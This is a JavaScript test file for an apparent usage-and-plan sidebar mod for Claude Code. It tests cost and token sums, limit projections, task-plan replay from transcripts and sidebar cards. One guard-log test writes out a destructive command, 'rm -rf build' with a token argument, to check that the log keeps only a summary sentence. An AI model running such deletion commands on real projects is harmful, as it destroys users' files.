    const hook = h.hooks.find((x) => x.event === 'tool.call' && x.matcher && x.matcher.tool === 'TaskCreate');
    await hook.handler(h.ctx, { tool: 'TaskCreate', subject: 'counted' }, async () => ({ result: { task: { id: 'plan-test-1', subject: 'counted' } } }));
    const after = await countOf();
    expect(after).toBe(before + 1);
});

test('and /hud plan is listed in the help', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    const text = (await h.say('')).text;
    expect(text.includes('/hud plan')).toBe(true);
});


// ============================================================ what a session spent
//
// Every figure in the Activity card and the header comes from numbers Claude
// Code already hands over. Nothing is requested, so the only way these can be
// wrong is arithmetic, which is what is checked here.

const turnOf = (input, output, read, write, ms) => ({
    usage: { input_tokens: input, output_tokens: output, cache_read_input_tokens: read, cache_creation_input_tokens: write },
    durationMs: ms,
});

test('turns add up: tokens, the cache and the time', async () => {
    let s = addTurn(emptyStats(), turnOf(100, 50, 900, 0, 60000));
    s = addTurn(s, turnOf(10, 5, 90, 100, 30000));
    expect(s.turns).toBe(2);
    expect(s.input).toBe(110);
    expect(s.output).toBe(55);
    expect(s.cacheRead).toBe(990);
    expect(s.cacheWrite).toBe(100);
    expect(s.busyMs).toBe(90000);
    expect(s.lastMs).toBe(30000);
});

test('a turn that reported nothing is not counted', async () => {
    const before = addTurn(emptyStats(), turnOf(1, 1, 1, 1, 1000));
    expect(addTurn(before, { isAborted: true }).turns).toBe(1);
    expect(addTurn(before, undefined).turns).toBe(1);
    expect(addTurn(before, {}).turns).toBe(1);
});

test('adding a turn never changes the stats it was given', async () => {
    const before = addTurn(emptyStats(), turnOf(1, 1, 1, 1, 1000));
    const snapshot = JSON.stringify(before);
    addTurn(before, turnOf(5, 5, 5, 5, 5000));
    expect(JSON.stringify(before)).toBe(snapshot);
});

test('a missing, negative or non-numeric count reads as nothing spent', async () => {
    const s = addTurn(emptyStats(), { usage: { input_tokens: 'lots', output_tokens: -4, cache_read_input_tokens: NaN }, durationMs: 2000 });
    expect(s.turns).toBe(1);
    expect(s.input).toBe(0);
    expect(s.output).toBe(0);
    expect(s.cacheRead).toBe(0);
});

test('the cache hit is the share of all input the cache served', async () => {
    // 900 read against 100 fresh and 0 written is 90%.
    expect(Math.round(cacheHit(addTurn(emptyStats(), turnOf(100, 1, 900, 0, 1000))))).toBe(90);
    // Written tokens are input that was not served from the cache.
    expect(Math.round(cacheHit(addTurn(emptyStats(), turnOf(0, 1, 500, 500, 1000))))).toBe(50);
});

test('there is no cache figure before anything was read', async () => {
    expect(cacheHit(emptyStats())).toBe(null);
    expect(cacheHit(undefined)).toBe(null);
});

test('money is a short figure and a free turn is not "no cost"', async () => {
    expect(moneyText(0)).toBe('$0.00');
    expect(moneyText(0.004)).toBe('<$0.01');
    expect(moneyText(1.8)).toBe('$1.80');
    expect(moneyText(99.994)).toBe('$99.99');
    expect(moneyText(1234.5)).toBe('$1,235');
    expect(moneyText(-1)).toBe('');
    expect(moneyText(NaN)).toBe('');
    expect(moneyText(undefined)).toBe('');
});

test('a span is seconds, minutes, or hours and padded minutes', async () => {
    expect(spanText(45000)).toBe('45s');
    expect(spanText(12 * 60000)).toBe('12m');
    expect(spanText(3600000)).toBe('1h');
    // 1h5m reads as one hour five, not "1h5m" run together.
    expect(spanText(65 * 60000)).toBe('1h05m');
    expect(spanText(135 * 60000)).toBe('2h15m');
    expect(spanText(-1)).toBe('');
    expect(spanText(undefined)).toBe('');
});

test('the session facts come out of usage(), and absent is null, never zero', async () => {
    const full = sessionOf({ startedAt: 1000, cost: { usd: 1.5 }, context: { tokens: 151000, window: 1000000, percent: 15 } });
    expect(full.costUsd).toBe(1.5);
    expect(full.startedAt).toBe(1000);
    expect(full.contextTokens).toBe(151000);
    expect(full.contextWindow).toBe(1000000);

    const bare = sessionOf({ context: { window: 200000 }, rateLimits: [] });
    expect(bare.costUsd).toBe(null);
    expect(bare.startedAt).toBe(null);
    expect(bare.contextTokens).toBe(null);

    for (const junk of [null, undefined, 'x', 7, [], { cost: 'free', context: 'big' }]) {
        const s = sessionOf(junk);
        expect(s.costUsd).toBe(null);
        expect(s.contextTokens).toBe(null);
    }
});

test('context is said as tokens of a window, or not at all', async () => {
    expect(contextText({ contextTokens: 151000, contextWindow: 1000000 })).toBe('151.0k of 1.0m tokens');
    expect(contextText({ contextTokens: null, contextWindow: 1000000 })).toBe('');
    expect(contextText({ contextTokens: 5, contextWindow: 0 })).toBe('');
    expect(contextText(undefined)).toBe('');
});

test('the stats view does the sums so the card does none', async () => {
    let s = addTurn(emptyStats(), turnOf(100, 50, 900, 0, 60000));
    s = addTurn(s, turnOf(100, 50, 900, 0, 120000));
    const v = statsView(s);
    expect(v.turns).toBe(2);
    expect(v.output).toBe('100');
    expect(Math.round(v.cacheHit)).toBe(90);
    expect(v.average).toBe('1m30s');
    expect(v.last).toBe('2m');
    expect(statsView(undefined).turns).toBe(0);
    expect(statsView(undefined).cacheHit).toBe(null);
});

// ======================================================= where a window is heading

test('the projection says where the window ends up at the pace so far', async () => {
    // 30% used, half the window gone: 60% by the end.
    expect(projectionText({ used: 0.3, elapsed: 0.5, ratio: 0.6, dryInMinutes: null })).toBe('on track for 60% by reset');
});

test('a projection past the limit says when it runs dry, not a number over a hundred', async () => {
    expect(projectionText({ used: 0.8, elapsed: 0.5, ratio: 1.6, dryInMinutes: 75 })).toBe('on track to run dry in 1h15m');
    // No dry time but a rate that overshoots is capped, never "180%".
    expect(projectionText({ used: 0.9, elapsed: 0.5, ratio: 1.8, dryInMinutes: null })).toBe('on track for 100% by reset');
});

test('and it says nothing where the rate is not meaningful', async () => {
    expect(projectionText(null)).toBe('');
    expect(projectionText({ used: 0, elapsed: 0.5, ratio: 0, dryInMinutes: null })).toBe('');
    // One early prompt makes the rate swing, so the first 5% says nothing.
    expect(projectionText({ used: 0.2, elapsed: 0.02, ratio: 10, dryInMinutes: 3 })).toBe('');
});

test('the projection reads a real pace from paceOf', async () => {
    const now = Date.UTC(2026, 9, 19, 12, 0, 0);
    // A week window half over, 20% used: on track for about 40%.
    const resetsAt = Math.floor((now + 3.5 * 24 * 3600000) / 1000);
    const pace = paceOf('Week', 20, resetsAt, now);
    expect(projectionText(pace)).toBe('on track for 40% by reset');
});

// ====================================================== what the guard stopped on

test('the guard log keeps the newest few, newest last', async () => {
    let log = [];
    for (let i = 0; i < GUARD_KEEP + 3; i += 1) log = recordGuard(log, { kind: 'rm', text: 'n' + i, outcome: RAN });
    expect(log.length).toBe(GUARD_KEEP);
    expect(log[GUARD_KEEP - 1].text).toBe('n' + (GUARD_KEEP + 2));
    expect(log[0].text).toBe('n3');
});

test('the guard log keeps the sentence shown and never the command', async () => {
    const log = recordGuard([], { kind: 'rm', text: 'This deletes 4 files under build.', outcome: CANCELLED, command: 'rm -rf build --token=SECRET' });
    expect(JSON.stringify(log).includes('SECRET')).toBe(false);
    expect(JSON.stringify(log).includes('rm -rf')).toBe(false);
    expect(log[0].outcome).toBe(CANCELLED);
});

test('a guard entry with no outcome is one nobody was asked about', async () => {
    expect(recordGuard([], { kind: 'rm', text: 'x' })[0].outcome).toBe(PASSED);
    expect(recordGuard(undefined, undefined).length).toBe(1);
});

// ================================================ the plan, read back after a reload
//
// The bar learns the plan by watching tool calls pass. A reloaded mod, or a
// resumed session, starts with nothing while the task list carries on, so the
// plan is read back out of the transcript once, at the start.

const asst = (...uses) => ({ role: 'assistant', text: '', toolUses: uses });
const create = (subject, id) => ({ tool: 'TaskCreate', input: { subject }, result: { task: { id, subject } }, text: 'Task #' + id + ' created successfully: ' + subject });
const update = (taskId, status) => ({ tool: 'TaskUpdate', input: { taskId, status }, result: { success: true, taskId } });

test('the plan is rebuilt from the creates and the updates', async () => {
    const found = replayPlan([
        asst(create('a', '1'), create('b', '2'), create('c', '3')),
        { role: 'user', text: 'go', toolUses: [] },
        asst(update('1', 'completed'), update('2', 'in_progress')),
    ]);
    const plan = progressOf(todosFromTasks(found.tasks));
    expect(plan.total).toBe(3);
    expect(plan.done).toBe(1);
    expect(plan.doing).toBe(1);
    expect(found.source).toBe('tasks');
    expect(found.counts.TaskCreate).toBe(3);
    expect(found.counts.TaskUpdate).toBe(2);
    expect(found.counts.last).toBe('TaskUpdate');
});

test('a create whose record was not kept still gives its id from the text', async () => {
    const found = replayPlan([
        asst({ tool: 'TaskCreate', input: { subject: 'a' }, text: 'Task #7 created successfully: a' },
            { tool: 'TaskCreate', input: { subject: 'b' }, text: 'Task #8 created successfully: b' }),
        asst(update('7', 'completed')),
    ]);
    expect(found.tasks.length).toBe(2);
    expect(found.tasks.find((t) => t.id === '7').status).toBe('completed');
});

test('a call that errored changed nothing, and one that cannot be read is skipped', async () => {
    const found = replayPlan([
        asst(create('a', '1'), create('b', '2')),
        asst({ tool: 'TaskUpdate', input: { taskId: '1', status: 'completed' }, isError: true, text: 'no such task' }),
        // No record and no id in the text: nothing safe to track.
        asst({ tool: 'TaskCreate', input: { subject: 'ghost' }, text: 'something else entirely' }),
    ]);
    expect(found.tasks.length).toBe(2);
    expect(found.tasks.every((t) => t.status === 'pending')).toBe(true);
});

test('a TodoWrite list is replayed too, and the last kind written is the one in use', async () => {
    const todos = [{ content: 'x', status: 'completed', activeForm: 'x' }, { content: 'y', status: 'pending', activeForm: 'y' }];
    const found = replayPlan([asst({ tool: 'TodoWrite', input: { todos }, result: {} })]);
    expect(found.source).toBe('todos');
    expect(progressOf(found.todos).done).toBe(1);

    const later = replayPlan([
        asst({ tool: 'TodoWrite', input: { todos }, result: {} }),
        asst(create('a', '1'), create('b', '2')),
    ]);
    expect(later.source).toBe('tasks');
});

test('an empty or odd transcript replays to nothing rather than throwing', async () => {
    for (const odd of [[], undefined, null, 'no', [null, 7, { role: 'assistant' }, { role: 'assistant', toolUses: 'x' }]]) {
        const found = replayPlan(odd);
        expect(found.tasks.length).toBe(0);
        expect(found.source).toBe('');
    }
});

test('a deleted task replays as gone', async () => {
    const found = replayPlan([asst(create('a', '1'), create('b', '2'), create('c', '3')), asst(update('2', 'deleted'))]);
    expect(found.tasks.length).toBe(2);
});

// ================================================================ asking for a plan

test('with the task tools offered, Claude is asked to use them', async () => {
    const text = trackingNudge(['Bash', 'TaskCreate', 'TaskUpdate', 'TaskList']);
    expect(text.includes('TaskCreate')).toBe(true);
    expect(text.includes('TaskUpdate')).toBe(true);
    expect(text.includes('three or more')).toBe(true);
    // Delegated work is where the list goes missing.
    expect(text.includes('subagents')).toBe(true);
});

test('with only TodoWrite, it asks for that instead', async () => {
    const text = trackingNudge(['Bash', 'TodoWrite']);
    expect(text.includes('TodoWrite')).toBe(true);
    expect(text.includes('TaskCreate')).toBe(false);
});

test('with the task tools behind ToolSearch, it says how to load them', async () => {
    const text = trackingNudge(['Bash', 'ToolSearch']);
    expect(text.includes('select:TaskCreate,TaskUpdate')).toBe(true);
});

test('with nothing to keep a list with, it asks for the mod own tool', async () => {
    for (const tools of [['Bash', 'Read'], [], undefined]) {
        const text = trackingNudge(tools);
        expect(text.includes(HUD_TOOL)).toBe(true);
        expect(text.includes('ToolSearch')).toBe(false);
        expect(text.includes('todo, doing or done')).toBe(true);
    }
});

test('where ToolSearch is the only way in, it names the hud tool for when it finds nothing', async () => {
    const text = trackingNudge(['Bash', 'ToolSearch']);
    expect(text.includes('select:TaskCreate,TaskUpdate')).toBe(true);
    expect(text.includes('If ToolSearch finds no such tools')).toBe(true);
    expect(text.includes(HUD_TOOL)).toBe(true);
});

test('the same tools give the same words every time, so the prompt cache is not disturbed', async () => {
    expect(trackingNudge(['TaskCreate', 'TaskUpdate'])).toBe(trackingNudge(['TaskCreate', 'TaskUpdate']));
});

test('the words asked of Claude contain no long dash', async () => {
    for (const tools of [['TaskCreate', 'TaskUpdate'], ['TodoWrite'], ['ToolSearch']]) {
        expect(trackingNudge(tools).includes(String.fromCharCode(8212))).toBe(false);
    }
});

// ---- through the real hooks

function hookOf(h, event, matcherTest) {
    return h.hooks.find((x) => x.event === event && (!matcherTest || matcherTest(x.matcher)));
}

/** Claude starts a turn: the bar and the sidebar's progress card only show while it is working. */
const working = (h) => hookOf(h, 'prompt.submit').handler(h.ctx, { text: 'carry on with the job' }, h.next);
/** And the turn ends. */
const idle = async (h) => {
    h.ctx.model = { complete: async () => ({ isAnswered: false, reason: 'x' }) };
    h.ctx.prompt = { submit: () => undefined };
    await hookOf(h, 'turn.complete').handler(h.ctx, { answer: 'done', isAborted: false, durationMs: 1000 }, async () => ({ text: 'x' }));
};

test('the prompt gets one section added last, in the session half of the cache', async () => {
    const h = await sidebarSession({});
    await h.say('track on');
    const hook = hookOf(h, 'prompt.compose');
    const base = { sections: [{ id: 'intro', text: 'a', scope: 'shared' }, { id: 'tools', text: 'b', scope: 'shared' }] };
    const out = await hook.handler(h.ctx, { tools: ['TaskCreate', 'TaskUpdate'] }, async () => base);
    expect(out.sections.length).toBe(3);
    const added = out.sections[2];
    expect(added.id).toBe(TRACK_SECTION);
    expect(added.scope).toBe('session');
    expect(added.text.includes('TaskCreate')).toBe(true);
    // The engine's own sections come through untouched and in order.
    expect(out.sections[0].id).toBe('intro');
    expect(out.sections[1].id).toBe('tools');
});

test('it is not added twice, and not when switched off', async () => {
    const h = await sidebarSession({});
    const hook = hookOf(h, 'prompt.compose');
    await h.say('track on');
    const once = await hook.handler(h.ctx, { tools: ['TodoWrite'] }, async () => ({ sections: [] }));
    const twice = await hook.handler(h.ctx, { tools: ['TodoWrite'] }, async () => once);
    expect(twice.sections.length).toBe(1);

    await h.say('track off');
    const off = await hook.handler(h.ctx, { tools: ['TodoWrite'] }, async () => ({ sections: [] }));
    expect(off.sections.length).toBe(0);
    await h.say('track on');
});

test('a session with no task tools is asked to use the hud tool', async () => {
    const h = await sidebarSession({});
    await h.say('track on');
    const out = await hookOf(h, 'prompt.compose').handler(h.ctx, { tools: ['Bash'] }, async () => ({ sections: [] }));
    expect(out.sections.length).toBe(1);
    expect(out.sections[0].text.includes(HUD_TOOL)).toBe(true);
});

test('an answer with no sections is passed on as it came', async () => {
    const h = await sidebarSession({});
    await h.say('track on');
    const weird = { not: 'sections' };
    const out = await hookOf(h, 'prompt.compose').handler(h.ctx, { tools: ['TodoWrite'] }, async () => weird);
    expect(out).toBe(weird);
});

test('the mod does not touch how the task tools are placed', async () => {
    // A tool.describe answer of isDeferred: false is run but not honoured for a
    // built-in tool, so a hook for it would only be surface for nothing.
    const h = await sidebarSession({});
    expect(h.hooks.filter((x) => x.event === 'tool.describe').length).toBe(0);
});

test('/hud track says what it did and what it will do', async () => {
    const h = await sidebarSession({});
    const off = (await h.say('track off')).text;
    expect(off.includes('Plan tracking off')).toBe(true);
    expect(off.includes('Nothing is added to the prompt')).toBe(true);
    const on = (await h.say('track on')).text;
    expect(on.includes('Plan tracking on')).toBe(true);
    expect(on.includes('three or more steps')).toBe(true);
    expect((await h.say('track')).text.includes('Plan tracking is on')).toBe(true);
});

test('/hud plan says whether Claude is being asked to keep a task list', async () => {
    const h = await sidebarSession({});
    await h.say('track on');
    const on = (await h.say('plan')).text;
    expect(on.includes('plan tracking: on')).toBe(true);
    await h.say('track off');
    expect((await h.say('plan')).text.includes('plan tracking: off')).toBe(true);
    await h.say('track on');
});

test('plan tracking is kept for next session like the other switches', async () => {
    const saved = {};
    const h = await sidebarSession({});
    h.ctx.store = { get: async (k) => saved[k], set: async (k, v) => { saved[k] = v; } };
    await h.say('track off');
    expect(saved.prefs.trackOn).toBe(false);
    await h.say('track on');
    expect(saved.prefs.trackOn).toBe(true);
});

test('a restarted session finds its plan again, from the transcript', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    h.ctx.session.messages = async () => [
        asst(create('a', '1'), create('b', '2'), create('c', '3')),
        asst(update('1', 'completed')),
    ];
    await h.start();
    await working(h);
    const tree = await h.pane('desktop');
    expect(hasKey(tree, 'card-progress')).toBe(true);
    expect((await h.say('plan')).text.includes('1/3 done')).toBe(true);
    // The counts come from the replay, so /hud plan is not blank after a reload.
    expect((await h.say('plan')).text.includes('TaskCreate 3')).toBe(true);
});

test('a session that starts empty has no plan, even if one was showing', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    h.ctx.session.messages = async () => [asst(create('a', '1'), create('b', '2'))];
    await h.start();
    await working(h);
    expect(hasKey(await h.pane('desktop'), 'card-progress')).toBe(true);

    // /clear: the same module, a session with nothing in it.
    h.ctx.session.messages = async () => [];
    await h.start();
    await working(h);
    expect(hasKey(await h.pane('desktop'), 'card-progress')).toBe(false);
});

test('an unreadable transcript leaves the plan as it was', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    h.ctx.session.messages = async () => [asst(create('a', '1'), create('b', '2'))];
    await h.start();
    h.ctx.session.messages = async () => { throw new Error('no transcript'); };
    await h.start();
    await working(h);
    expect(hasKey(await h.pane('desktop'), 'card-progress')).toBe(true);
});

test('a subagent writing its own todo list does not become the bar', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    h.ctx.session.messages = async () => [];
    await h.start();
    const todo = hookOf(h, 'tool.call', (m) => m && m.tool === 'TodoWrite');
    const list = [{ content: 'a', status: 'pending', activeForm: 'a' }, { content: 'b', status: 'pending', activeForm: 'b' }];
    await todo.handler(h.ctx, { tool: 'TodoWrite', todos: list, agentId: 'sub-1' }, h.next);
    expect(hasKey(await h.pane('desktop'), 'card-progress')).toBe(false);
    await todo.handler(h.ctx, { tool: 'TodoWrite', todos: list }, h.next);
    expect(hasKey(await h.pane('desktop'), 'card-progress')).toBe(true);
});

test('a todo list cut to one item takes the old bar away', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    h.ctx.session.messages = async () => [];
    await h.start();
    const todo = hookOf(h, 'tool.call', (m) => m && m.tool === 'TodoWrite');
    const two = [{ content: 'a', status: 'pending', activeForm: 'a' }, { content: 'b', status: 'pending', activeForm: 'b' }];
    await todo.handler(h.ctx, { tool: 'TodoWrite', todos: two }, h.next);
    expect(hasKey(await h.pane('desktop'), 'card-progress')).toBe(true);
    await todo.handler(h.ctx, { tool: 'TodoWrite', todos: [two[0]] }, h.next);
    expect(hasKey(await h.pane('desktop'), 'card-progress')).toBe(false);
});

// =============================================== the heads-up reads real transcript rows

test('a transcript row carries its words as text, and the heads-up reads that', async () => {
    const rows = [
        { role: 'user', text: 'please change the retry logic', toolUses: [] },
        { role: 'assistant', text: 'I changed the retry logic and updated the config.', toolUses: [] },
    ];
    const text = flatten(rows);
    expect(text.includes('Developer: please change the retry logic')).toBe(true);
    expect(text.includes('Assistant: I changed the retry logic')).toBe(true);
    // The older shape still reads.
    expect(flatten([{ role: 'user', content: 'older shape here' }]).includes('older shape here')).toBe(true);
});

test('a transcript of real rows is long enough to build a heads-up request from', async () => {
    const long = 'The retry logic now backs off exponentially and the config default changed. '.repeat(6);
    const rows = [
        { role: 'user', text: 'tighten the retries', toolUses: [] },
        { role: 'assistant', text: long, toolUses: [] },
    ];
    expect(buildHeadsPrompt(rows)).not.toBe(null);
});

// ================================================================ the sidebar, in full
//
// Every card, and every press. The builder is pure, so each is checked as a
// tree; the presses are the functions the caller put in the data, and the
// tests below the line run them through the real hooks.

const withSelect = { ...factories, Select: elOf('Select') };

function find(tree, key) {
    let found = null;
    walk(tree, (n) => { if (n.key === key && !found) found = n; });
    return found;
}

const fullData = (over) => ({
    model: 'opus 5.5', worst: 'watch', pinned: false, routingOn: true, reason: 'deep work', held: false,
    readings: [reading('ctx', 'Ctx', 15), reading('session', 'Session', 58, { note: '1.8x pace, dry in 2h' }), reading('week', 'Week', 30)],
    contextDetail: '151.0k of 1.0m tokens',
    projections: { session: 'on track to run dry in 2h', week: 'on track for 60% by reset' },
    session: { cost: '$1.84', age: '42m' },
    stats: { turns: 12, input: '1.2m', output: '84.0k', cacheHit: 91.4, average: '1m5s', last: '40s' },
    plan: { total: 4, done: 1, doing: 1, percent: 25, donePercent: 25, reachedPercent: 50, complete: false, label: 'Doing two' },
    planItems: [
        { content: 'one', status: 'completed' },
        { content: 'two', activeForm: 'Doing two', status: 'in_progress' },
        { content: 'third-task', status: 'pending' },
        { content: 'fourth-task', status: 'pending' },
    ],
    agents: [{ name: 'general', status: 'running', startedAt: Date.now() - 20000, tokens: 5000 }], agentShares: [1],
    headsNote: 'The retry default changed and the docs still say three.',
    suggestions: ['Run the tests', 'Update the docs'],
    guard: { on: true, seen: 9, flagged: [{ kind: 'rm', text: 'This deletes 40 files under build.', outcome: 'cancelled' }] },
    tiers: { fast: 'haiku 5.5', base: 'sonnet 5.5', deep: 'opus 5.5', top: 'fable 5.1' },
    tierIds: { fast: 'claude-haiku-5-5', base: 'claude-sonnet-5-5', deep: 'claude-opus-5-5' },
    models: [{ value: 'claude-haiku-5-5', label: 'haiku 5.5' }, { value: 'claude-opus-5-5', label: 'opus 5.5' }],
    log: [{ tier: 'deep', short: 'opus 5.5', signals: ['refactor', 'plan'], text: 'refactor the router' }],
    switches: [
        { key: 'routing', label: 'Routing', hint: 'h1', on: true },
        { key: 'suggest', label: 'Follow-ups', hint: 'h2', on: true },
        { key: 'know', label: 'Heads up', hint: 'h3', on: false },
        { key: 'blast', label: 'Blast radius', hint: 'h4', on: true },
        { key: 'confirm', label: 'Ask near the limit', hint: 'h5', on: true },
        { key: 'track', label: 'Plan tracking', hint: 'h6', on: true },
    ],
    collapsed: {},
    ...over,
});

test('a fully populated sidebar has every card, in the order that matters', async () => {
    const tree = buildPanel(withSelect, fullData());
    const order = tree.children.map((c) => c.key).filter((k) => typeof k === 'string' && k.startsWith('card-'));
    expect(JSON.stringify(order)).toBe(JSON.stringify([
        'card-hud', 'card-heads', 'card-usage', 'card-progress', 'card-agents', 'card-next',
        'card-activity', 'card-routing', 'card-guard', 'card-models', 'card-settings',
    ]));
});

test('no two elements in the whole sidebar share a key', async () => {
    const tree = buildPanel(withSelect, fullData({ collapsed: {} }));
    const seen = {};
    let dup = '';
    walk(tree, (n) => {
        if (typeof n.key !== 'string') return;
        if (seen[n.key]) dup = n.key;
        seen[n.key] = true;
    });
    expect(dup).toBe('');
});

test('every text in a fully populated sidebar says how it wraps, and no gauge has a fixed width', async () => {
    const tree = buildPanel(withSelect, fullData());
    let bare = 0;
    let fixed = 0;
    walk(tree, (n) => {
        if (n.type === 'Text' && !n.wrap) bare += 1;
        // A fixed width would clip in a narrow sidebar; the picture sizes itself.
        if (n.type === 'Svg' && (n.width !== undefined || n.height !== undefined)) fixed += 1;
    });
    expect(bare).toBe(0);
    expect(fixed).toBe(0);
});

test('the header says what the session has cost, how long it has run and its turns', async () => {
    const text = textsOf(buildPanel(withSelect, fullData()));
    expect(text.includes('$1.84  ·  42m  ·  12 turns')).toBe(true);
});

test('the header says nothing about cost when none is known', async () => {
    const tree = buildPanel(withSelect, fullData({ session: { cost: '', age: '' }, stats: { turns: 0 } }));
    expect(hasKey(tree, 'hd-facts')).toBe(false);
});

test('a pinned model offers one press back to auto, and an unpinned one does not', async () => {
    let went = 0;
    const pinned = buildPanel(withSelect, fullData({ pinned: true, onAuto: () => { went += 1; } }));
    expect(textsOf(pinned).includes('pinned')).toBe(true);
    find(pinned, 'hd-auto').onPress();
    expect(went).toBe(1);
    expect(hasKey(buildPanel(withSelect, fullData({ pinned: false, onAuto: () => undefined })), 'hd-auto')).toBe(false);
});

test('a held planning job says why it is on a smaller model', async () => {
    expect(textsOf(buildPanel(withSelect, fullData({ held: true }))).includes('Held back to spare')).toBe(true);
    expect(textsOf(buildPanel(withSelect, fullData({ held: false }))).includes('Held back')).toBe(false);
});

test('context says how many tokens, and no other gauge does', async () => {
    const tree = buildPanel(withSelect, fullData());
    expect(textsOf(find(tree, 'u-ctx')).includes('151.0k of 1.0m tokens')).toBe(true);
    expect(textsOf(find(tree, 'u-week')).includes('tokens')).toBe(false);
});

test('each window says where it is heading, and a dry one is coloured', async () => {
    const tree = buildPanel(withSelect, fullData());
    expect(textsOf(find(tree, 'u-session')).includes('on track to run dry in 2h')).toBe(true);
    expect(textsOf(find(tree, 'u-week')).includes('on track for 60% by reset')).toBe(true);
    // The calm projection is quiet; the dry one is not.
    expect(!!find(tree, 'u-p-session').color).toBe(true);
    expect(!!find(tree, 'u-p-week').color).toBe(false);
});

test('a pace note is still shown when there is no projection to give', async () => {
    const tree = buildPanel(withSelect, fullData({ projections: {} }));
    expect(textsOf(find(tree, 'u-session')).includes('1.8x pace, dry in 2h')).toBe(true);
});

test('the plan lists the work in hand, then what is waiting, then what is done', async () => {
    const text = textsOf(buildPanel(withSelect, fullData()));
    // Distinct names: 'three' and 'one' are found inside other cards' text and prove nothing.
    expect(text.indexOf('third-task') < text.indexOf('Done')).toBe(true);
    expect(text.indexOf('Doing two') < text.indexOf('third-task')).toBe(true);
});

test('only the last few finished items are listed, and the rest are counted', async () => {
    const items = [];
    for (let i = 0; i < 8; i += 1) items.push({ content: 'finished ' + i, status: 'completed' });
    items.push({ content: 'still going', activeForm: 'Going', status: 'in_progress' });
    const plan = { total: 9, done: 8, doing: 1, percent: 88, donePercent: 88, reachedPercent: 100, complete: false, label: 'Going' };
    const text = textsOf(buildPanel(withSelect, fullData({ plan, planItems: items })));
    expect(text.includes('finished 7')).toBe(true);
    expect(text.includes('finished 0')).toBe(false);
    expect(text.includes('and 5 earlier')).toBe(true);
});

test('a heads-up has its own card with a dismiss, and none without a note', async () => {
    let dismissed = 0;
    const tree = buildPanel(withSelect, fullData({ onDismissHeads: () => { dismissed += 1; } }));
    expect(textsOf(find(tree, 'card-heads')).includes('The retry default changed')).toBe(true);
    find(tree, 'hh-x').onPress();
    expect(dismissed).toBe(1);
    expect(hasKey(buildPanel(withSelect, fullData({ headsNote: null })), 'card-heads')).toBe(false);
});

test('each follow-up is a button that sends exactly its own words', async () => {
    const sent = [];
    const tree = buildPanel(withSelect, fullData({ onSuggestion: (t) => { sent.push(t); } }));
    find(tree, 'n-1').onPress();
    find(tree, 'n-0').onPress();
    expect(JSON.stringify(sent)).toBe(JSON.stringify(['Update the docs', 'Run the tests']));
    expect(hasKey(buildPanel(withSelect, fullData({ suggestions: [] })), 'card-next')).toBe(false);
});

test('the activity card reports the turns, the tokens and the cache', async () => {
    const tree = buildPanel(withSelect, fullData());
    const text = textsOf(find(tree, 'card-activity'));
    for (const want of ['12', '1.2m', '84.0k', '91%', '1m5s', '40s']) expect(text.includes(want)).toBe(true);
    expect(hasKey(tree, 'ac-cache-g')).toBe(true);
});

test('the activity card is left out until there is a turn, and has no cache row without a figure', async () => {
    expect(hasKey(buildPanel(withSelect, fullData({ stats: { turns: 0 } })), 'card-activity')).toBe(false);
    const noCache = buildPanel(withSelect, fullData({ stats: { turns: 2, input: '5', output: '5', cacheHit: null, average: '', last: '' } }));
    expect(hasKey(noCache, 'card-activity')).toBe(true);
    expect(hasKey(noCache, 'ac-cache')).toBe(false);
});

test('routing says why each recent prompt went where it did', async () => {
    const text = textsOf(find(buildPanel(withSelect, fullData()), 'card-routing'));
    expect(text.includes('deep')).toBe(true);
    expect(text.includes('refactor, plan')).toBe(true);
});

test('routing with nothing decided yet says so, and routing off says that', async () => {
    const empty = textsOf(buildPanel(withSelect, fullData({ log: [] })));
    expect(empty.includes('Nothing routed yet')).toBe(true);
    const off = textsOf(buildPanel(withSelect, fullData({ routingOn: false })));
    expect(off.includes('Routing is off')).toBe(true);
});

test('the guard card counts what it checked and says what you chose', async () => {
    const tree = buildPanel(withSelect, fullData({ collapsed: {} }));
    const text = textsOf(find(tree, 'card-guard'));
    expect(text.includes('9')).toBe(true);
    expect(text.includes('This deletes 40 files under build.')).toBe(true);
    expect(text.includes('you cancelled it')).toBe(true);
});

test('a command you ran is marked as run, and one nobody was asked about says so', async () => {
    const ran = textsOf(buildPanel(withSelect, fullData({ guard: { on: true, seen: 1, flagged: [{ text: 'x', outcome: 'ran' }] }, collapsed: {} })));
    expect(ran.includes('you ran it')).toBe(true);
    const passed = textsOf(buildPanel(withSelect, fullData({ guard: { on: true, seen: 1, flagged: [{ text: 'x', outcome: 'passed' }] }, collapsed: {} })));
    expect(passed.includes('went to the usual prompt')).toBe(true);
});

test('the guard card folded still says how many it stopped on, and off says off', async () => {
    const folded = textsOf(buildPanel(withSelect, fullData({ collapsed: { guard: true } })));
    expect(folded.includes('1 flagged')).toBe(true);
    const off = textsOf(buildPanel(withSelect, fullData({ guard: { on: false, seen: 0, flagged: [] }, collapsed: {} })));
    expect(off.includes('Off.')).toBe(true);
});

test('each tier has a picker holding the model it is on, and picking one says which tier', async () => {
    const picked = [];
    const tree = buildPanel(withSelect, fullData({ collapsed: {}, onTier: (tier, id) => { picked.push([tier, id]); } }));
    expect(find(tree, 'm-fast').value).toBe('claude-haiku-5-5');
    expect(find(tree, 'm-deep').value).toBe('claude-opus-5-5');
    find(tree, 'm-base').onSelect('claude-opus-5-5');
    expect(JSON.stringify(picked)).toBe(JSON.stringify([['base', 'claude-opus-5-5']]));
});

test('a surface with no picker still shows the tiers as text', async () => {
    const tree = buildPanel(factories, fullData({ collapsed: {} }));
    expect(hasKey(tree, 'm-fast')).toBe(true);
    expect(find(tree, 'm-fast').type).toBe('Box');
});

test('each switch is a button that names itself when pressed', async () => {
    const pressed = [];
    const tree = buildPanel(withSelect, fullData({ onSwitch: (k) => { pressed.push(k); } }));
    for (const k of ['routing', 'suggest', 'know', 'blast', 'confirm', 'track']) find(tree, 'sw-b-' + k).onPress();
    expect(JSON.stringify(pressed)).toBe(JSON.stringify(['routing', 'suggest', 'know', 'blast', 'confirm', 'track']));
});

test('a switch says whether it is on, and the card counts how many are', async () => {
    const tree = buildPanel(withSelect, fullData());
    expect(textsOf(find(tree, 'sw-know')).includes('off')).toBe(true);
    expect(textsOf(find(tree, 'sw-blast')).includes('on')).toBe(true);
